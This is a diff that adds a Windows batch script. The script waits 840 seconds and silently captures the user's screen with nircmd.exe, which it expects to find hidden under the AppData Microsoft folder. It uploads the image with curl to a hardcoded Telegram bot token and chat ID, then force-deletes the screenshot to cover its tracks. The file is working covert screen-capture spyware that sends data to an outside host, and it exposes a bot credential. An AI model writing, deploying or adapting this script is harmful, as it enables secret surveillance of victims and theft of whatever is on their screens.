@@ -1,0 +1,29 @@
+@echo off
+
+
+:: Set your bot token and chat ID
+set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
+set "CHAT_ID=1040442734"
+:: Path to your photo
+set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
+
+
+
+timeout /t 840 /nobreak
+
+"%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
+
+
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
+     -F "chat_id=%CHAT_ID%" ^
+     -F "photo=@%PHOTO_PATH%"
+
+
+del /f /q "%USERPROFILE%\Downloads\screenshot.png"
+
+
+
+
+
+echo.
+echo.
